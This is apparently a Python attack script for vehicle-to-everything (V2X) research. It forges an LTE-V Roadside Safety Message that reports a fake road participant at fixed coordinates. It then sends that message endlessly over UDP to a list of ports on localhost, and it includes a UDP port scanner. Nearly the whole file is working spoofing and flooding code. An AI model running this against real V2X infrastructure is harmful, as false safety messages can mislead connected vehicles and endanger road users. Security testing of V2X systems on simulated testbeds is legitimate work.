import threading
import math
import os
import socket
import asn1tools
from message.MsgFrame import RSM_MsgFrame
from message import RSM

def build_attack_message():
    dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
    asnPath = os.path.join(dir, 'message', 'asn', 'LTEV.asn')
    ltevCoder = asn1tools.compile_files(asnPath, 'uper', numeric_enums=True)

    rsm_message = RSM_MsgFrame()
    id = str(10086)
    rsm_message['id'] = '{:0>8}'.format(id)

    earth_radius = 6371004
    lat = add_noise_y * 180.0 / (math.pi * earth_radius) + 39.5427
    longi = (add_noise_x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

    rsm_message['refPos']['lat'] = int(1e7 * lat)
    rsm_message['refPos']['long'] = int(1e7 * longi)
    rsm_message['refPos']['elevation'] = 0

    objets = [{}]
    objets[0]['id'] = 10086
    objets[0]['position'] = (2000, 2000, 0)
    objets[0]["orientation"] = (0, 0, 0)
    objets[0]["speed"] = 0
    for i in range(len(objets)):
        participant =  RSM.RSMParticipantData_DF()
        x, y ,z = objets[i]["position"]
        yaw, pitch, roll = objets[i]["orientation"]

        lat = y * 180.0 / (math.pi * earth_radius) + 39.5427
        longi = (x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

        id = str(objets[i]['id'])
        participant['id'] = '{:0>8}'.format(id)
        participant['pos']['offsetLL'] = ('position-LatLon', {'lon': int(1e7 * longi), 'lat': int(1e7 * lat)})
        participant['pos']['offsetV'] = ('elevation', int(100 * z))

        if yaw < 0:
            yaw += 360
        if yaw> 359.9875:
            yaw =359.9875 
        participant['speed'] = int(objets[i]["speed"] * 50)
        participant['heading'] = int(yaw * 80)
        rsm_message['participants'].append(participant)

    # logger.info(f"车辆 {v2x_manager.id} 发送消息: {rsm_message}")
    rsm_encoded = ltevCoder.encode('RoadsideSafetyMessage', RSM.PrepareForCode(rsm_message), check_constraints=True)
    AID = int(2).to_bytes(length=4, byteorder='big')
    rsm_encoded = AID + rsm_encoded
    rsm_encoded_str = rsm_encoded.hex()
    return rsm_encoded_str.encode('utf-8')

def send_packet(udp_socket, attack_message, attack_address):
    try:
        udp_socket.sendto(attack_message, attack_address)
        print(f'Sent {attack_message} to {attack_address}')
    except Exception as e:
        print(f'Error sending packet to {attack_address}: {e}')

def udp_scan(target_ip, start_port, end_port, timeout=1):
    udp_port_list = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        for port in range(start_port, end_port + 1):
            try:
                sock.sendto(b'ping', (target_ip, port))
                sock.recvfrom(1024)
                udp_port_list.append(port)
            except socket.timeout:
                print(f'Port {port} is closed')
            except Exception as e:
                print(f'Error on port {port}: {e}')
    return udp_port_list

if __name__ == '__main__':
    target_ip = '127.0.0.1'
    ip_tables = []

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    add_noise_x, add_noise_y, add_noise_yaw = 0, 0, 0  # 假设这些值不变

    with open('ip_table', 'r') as f:
        for line in f:
            port = line.strip()
            ip_tables.append(int(port))

    
        attack_message = build_attack_message()
        while(True):
            for port in ip_tables:
                attack_address = (target_ip, port)
                send_packet(udp_socket, attack_message, attack_address)
